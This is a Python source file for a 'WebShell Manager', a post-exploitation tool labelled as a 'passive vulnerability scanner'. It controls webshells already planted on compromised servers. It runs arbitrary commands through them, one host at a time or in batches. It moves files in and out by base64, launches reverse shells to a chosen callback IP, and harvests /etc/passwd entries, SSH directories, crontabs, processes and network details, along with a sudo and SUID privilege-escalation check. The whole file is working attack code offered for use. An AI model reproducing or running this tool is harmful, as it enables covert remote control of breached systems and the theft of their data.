#!/usr/bin/env python3
"""
Passive Vulnerability Scanner v3.1 — WebShell Manager

Connect to, manage, and command deployed webshells.
Supports:
  - Connectivity checking
  - Arbitrary command execution
  - File upload/download
  - Reverse shell launch
  - System info gathering
  - Batch command across multiple webshells
  - Interactive shell mode

Usage:
  python3 webshell_manager.py check ws_list.json
  python3 webshell_manager.py exec ws_list.json --cmd "whoami; id; uname -a"
  python3 webshell_manager.py reverse ws_list.json --ip 10.0.0.1 --port 9999
  python3 webshell_manager.py interactive ws_list.json
  python3 webshell_manager.py harvest ws_list.json
"""

import json
import sys
import os
import re
import time
import base64
import argparse
import readline  # for interactive mode
from urllib.parse import urlparse
from datetime import datetime

try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False


class WebShellManager:
    """Manage and interact with deployed webshells."""

    def __init__(self, ws_list_path=None):
        self.webshells = []
        self.http_session = requests.Session() if HAS_REQUESTS else None
        self.http_session.verify = False
        if ws_list_path and os.path.exists(ws_list_path):
            self.load(ws_list_path)

    def load(self, path):
        """Load webshell list from JSON file."""
        with open(path, 'r') as f:
            data = json.load(f)
        # Support both direct list and attack_results.json format
        if isinstance(data, list):
            self.webshells = data
        elif isinstance(data, dict):
            if 'webshells_deployed' in data:
                self.webshells = [w for w in data['webshells_deployed'] if w.get('webshell_url')]
            elif 'webshells' in data:
                self.webshells = data['webshells']
        print(f"[+] Loaded {len(self.webshells)} webshell(s)")

    def save(self, path):
        """Save webshell list to JSON."""
        with open(path, 'w') as f:
            json.dump(self.webshells, f, indent=2)

    def add(self, url, password='cmd', host=None):
        """Add a webshell to the manager."""
        self.webshells.append({
            'webshell_url': url,
            'password': password,
            'host': host or urlparse(url).netloc,
            'added': datetime.now().isoformat(),
        })

    def check_all(self):
        """Check connectivity of all webshells."""
        results = []
        for i, ws in enumerate(self.webshells):
            url = ws.get('webshell_url', '')
            pwd = ws.get('password', 'cmd')
            alive = self._test_connectivity(url, pwd)
            ws['alive'] = alive
            ws['last_check'] = datetime.now().isoformat()
            status = '✅ ALIVE' if alive else '❌ DEAD'
            results.append({'index': i, 'url': url, 'status': status})
            print(f"  [{i}] {status} — {url}")
        return results

    def _test_connectivity(self, url, password):
        """Test if a webshell is alive."""
        if not self.http_session:
            return False
        try:
            # PHP simple
            resp = self.http_session.post(
                url, data={password: 'echo "LIVE_VERIFY";'},
                timeout=10, verify=False
            )
            if resp and 'LIVE_VERIFY' in (resp.text or ''):
                return True
            # JSP cmd
            resp = self.http_session.get(
                url, params={'cmd': 'echo LIVE_VERIFY'},
                timeout=10, verify=False
            )
            if resp and 'LIVE_VERIFY' in (resp.text or ''):
                return True
        except Exception:
            pass
        return False

    def execute(self, index_or_url, command):
        """Execute a command on a webshell and return output."""
        ws = self._resolve(index_or_url)
        if not ws:
            return None

        url = ws.get('webshell_url', '')
        pwd = ws.get('password', 'cmd')

        if not self.http_session:
            return 'Error: requests not installed'

        output = ''

        # Try PHP style
        try:
            resp = self.http_session.post(
                url, data={pwd: f'system("{command} 2>&1");'},
                timeout=30, verify=False
            )
            if resp and resp.text:
                output = resp.text
                # Clean up PHP warnings from output
                output = re.sub(r'<br\s*/?>.*?on line \d+', '', output)
                output = re.sub(r'<b>[^<]+</b>.*?on line \d+', '', output)
        except Exception:
            pass

        # Try JSP/ASPX style if PHP didn't work
        if not output or len(output) < 10:
            try:
                resp = self.http_session.get(
                    url, params={'cmd': command, 'c': command},
                    timeout=30, verify=False
                )
                if resp and resp.text:
                    output = resp.text
            except Exception:
                pass

        return output

    def execute_batch(self, command):
        """Execute command across all alive webshells."""
        for i, ws in enumerate(self.webshells):
            if ws.get('alive', False):
                print(f"\n── [{i}] {ws.get('webshell_url','')} ──")
                output = self.execute(i, command)
                print(output[:2000] if output else '(no output)')

    def upload_file(self, index_or_url, local_path, remote_path):
        """Upload a file via webshell."""
        ws = self._resolve(index_or_url)
        if not ws:
            return False

        with open(local_path, 'rb') as f:
            content = f.read()

        content_b64 = base64.b64encode(content).decode()
        # Upload via PHP webshell using base64 decode
        cmd = f'echo {content_b64} | base64 -d > {remote_path}'
        output = self.execute(index_or_url, cmd)
        # Verify
        verify = self.execute(index_or_url, f'ls -la {remote_path} 2>&1')
        if verify and 'No such file' not in verify and len(verify) > 5:
            print(f"[+] Uploaded: {remote_path}")
            return True
        print(f"[-] Upload may have failed: {verify[:100] if verify else 'no output'}")
        return False

    def download_file(self, index_or_url, remote_path, local_path):
        """Download a file from the target via webshell."""
        ws = self._resolve(index_or_url)
        if not ws:
            return False

        output = self.execute(index_or_url, f'cat {remote_path} | base64 -w0 2>&1')
        if output and 'No such file' not in output:
            try:
                content = base64.b64decode(output.strip())
                with open(local_path, 'wb') as f:
                    f.write(content)
                print(f"[+] Downloaded: {local_path} ({len(content)} bytes)")
                return True
            except Exception as e:
                print(f"[-] Decode failed: {e}")
        return False

    def launch_reverse_shell(self, index_or_url, ip, port, lang='bash'):
        """Launch reverse shell from webshell."""
        from scripts.core_engine import WebshellGenerator
        shell_cmd = WebshellGenerator.generate_reverse_shell(lang, ip, port)
        print(f"[*] Launching {lang} reverse shell to {ip}:{port}...")
        output = self.execute(index_or_url, shell_cmd)
        print(f"[+] Command sent. Start listener: nc -lvnp {port}")
        return shell_cmd

    def harvest_info(self, index_or_url):
        """Gather comprehensive system info."""
        commands = {
            'whoami': 'whoami',
            'id': 'id',
            'hostname': 'hostname',
            'uname': 'uname -a',
            'os': 'cat /etc/os-release 2>/dev/null | head -5',
            'network': 'ifconfig 2>/dev/null || ip addr 2>/dev/null',
            'listening': 'netstat -tlnp 2>/dev/null | head -20',
            'processes': 'ps aux 2>/dev/null | head -20',
            'users': 'cat /etc/passwd 2>/dev/null | grep -E "/bin/(bash|sh)" | head -10',
            'home': 'ls -la /home/ 2>/dev/null; ls -la /root/ 2>/dev/null',
            'ssh': 'ls -la ~/.ssh/ 2>/dev/null',
            'cron': 'crontab -l 2>/dev/null',
            'disk': 'df -h 2>/dev/null | head -10',
            'memory': 'free -h 2>/dev/null',
        }

        info = {}
        for name, cmd in commands.items():
            output = (self.execute(index_or_url, cmd) or '').strip()
            if output:
                info[name] = output
                print(f"\n── {name} ──")
                print(output[:500])

        return info

    def interactive(self, index=0):
        """Interactive shell mode through webshell."""
        ws = self._resolve(index)
        if not ws:
            return

        url = ws.get('webshell_url', '')
        host = ws.get('host', urlparse(url).netloc)
        print(f"\n╔══════════════════════════════════════════╗")
        print(f"║  WebShell Interactive Mode               ║")
        print(f"║  Target: {url[:50]}...  ║")
        print(f"║  Type 'exit' to quit, 'help' for commands ║")
        print(f"╚══════════════════════════════════════════╝\n")

        while True:
            try:
                cmd = input(f"ws@{host}$ ").strip()
            except (EOFError, KeyboardInterrupt):
                print("\n[*] Exiting...")
                break

            if not cmd:
                continue

            if cmd.lower() == 'exit':
                break
            elif cmd.lower() == 'help':
                print("Commands: exit, help, upload <local> <remote>, download <remote> <local>,")
                print("         reverse <ip> <port> [lang], harvest, sudo (check privesc)")
                continue
            elif cmd.lower().startswith('upload '):
                parts = cmd.split()
                if len(parts) >= 3:
                    self.upload_file(index, parts[1], parts[2])
                continue
            elif cmd.lower().startswith('download '):
                parts = cmd.split()
                if len(parts) >= 3:
                    self.download_file(index, parts[1], parts[2])
                continue
            elif cmd.lower().startswith('reverse '):
                parts = cmd.split()
                if len(parts) >= 3:
                    lang = parts[3] if len(parts) > 3 else 'bash'
                    self.launch_reverse_shell(index, parts[1], int(parts[2]), lang)
                continue
            elif cmd.lower() == 'harvest':
                self.harvest_info(index)
                continue
            elif cmd.lower() == 'sudo':
                output = self.execute(index, 'sudo -l 2>/dev/null; find / -perm -4000 -type f 2>/dev/null | head -20')
                print(output[:2000] if output else '(no output)')
                continue

            # Execute command
            output = self.execute(index, cmd)
            if output:
                # Strip HTML
                output = re.sub(r'<[^>]+>', '', output)
                print(output[:5000])
            else:
                print('(no output)')

    def _resolve(self, index_or_url):
        """Resolve webshell by index or URL."""
        if isinstance(index_or_url, int):
            if 0 <= index_or_url < len(self.webshells):
                return self.webshells[index_or_url]
        if isinstance(index_or_url, str) and '://' in index_or_url:
            for ws in self.webshells:
                if ws.get('webshell_url') == index_or_url:
                    return ws
        return None


def main():
    if not HAS_REQUESTS:
        print("Error: pip install requests")
        sys.exit(1)

    parser = argparse.ArgumentParser(
        description='WebShell Manager — control deployed webshells',
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    sub = parser.add_subparsers(dest='action', help='Action')

    # check
    p_check = sub.add_parser('check', help='Check webshell connectivity')
    p_check.add_argument('ws_file', help='Webshell list JSON')

    # exec
    p_exec = sub.add_parser('exec', help='Execute command on webshell(s)')
    p_exec.add_argument('ws_file', help='Webshell list JSON')
    p_exec.add_argument('--cmd', required=True, help='Command to execute')
    p_exec.add_argument('--index', type=int, default=0, help='Webshell index (default: 0)')
    p_exec.add_argument('--batch', action='store_true', help='Execute on ALL alive webshells')

    # reverse
    p_rev = sub.add_parser('reverse', help='Launch reverse shell')
    p_rev.add_argument('ws_file', help='Webshell list JSON')
    p_rev.add_argument('--ip', required=True, help='Callback IP')
    p_rev.add_argument('--port', type=int, default=4444, help='Callback port')
    p_rev.add_argument('--lang', default='bash', help='Shell type: bash/python/php/perl/nc/powershell')
    p_rev.add_argument('--index', type=int, default=0, help='Webshell index')

    # harvest
    p_harvest = sub.add_parser('harvest', help='Gather system info')
    p_harvest.add_argument('ws_file', help='Webshell list JSON')
    p_harvest.add_argument('--index', type=int, default=0, help='Webshell index')
    p_harvest.add_argument('-o', '--output', help='Save info to JSON')

    # interactive
    p_interactive = sub.add_parser('interactive', help='Interactive shell mode')
    p_interactive.add_argument('ws_file', help='Webshell list JSON')
    p_interactive.add_argument('--index', type=int, default=0, help='Webshell index')

    # upload
    p_up = sub.add_parser('upload', help='Upload file')
    p_up.add_argument('ws_file', help='Webshell list JSON')
    p_up.add_argument('local', help='Local file path')
    p_up.add_argument('remote', help='Remote file path')
    p_up.add_argument('--index', type=int, default=0, help='Webshell index')

    # download
    p_down = sub.add_parser('download', help='Download file')
    p_down.add_argument('ws_file', help='Webshell list JSON')
    p_down.add_argument('remote', help='Remote file path')
    p_down.add_argument('local', help='Local file path')
    p_down.add_argument('--index', type=int, default=0, help='Webshell index')

    args = parser.parse_args()

    if not args.action:
        parser.print_help()
        sys.exit(1)

    mgr = WebShellManager(args.ws_file)

    if args.action == 'check':
        mgr.check_all()

    elif args.action == 'exec':
        if args.batch:
            mgr.execute_batch(args.cmd)
        else:
            output = mgr.execute(args.index, args.cmd)
            if output:
                print(output)
            else:
                print(f"[-] No output from webshell {args.index}")

    elif args.action == 'reverse':
        mgr.launch_reverse_shell(args.index, args.ip, args.port, args.lang)

    elif args.action == 'harvest':
        info = mgr.harvest_info(args.index)
        if args.output:
            with open(args.output, 'w') as f:
                json.dump(info, f, indent=2)
            print(f"\n[+] Saved to: {args.output}")

    elif args.action == 'interactive':
        mgr.interactive(args.index)

    elif args.action == 'upload':
        mgr.upload_file(args.index, args.local, args.remote)

    elif args.action == 'download':
        mgr.download_file(args.index, args.remote, args.local)


if __name__ == '__main__':
    main()
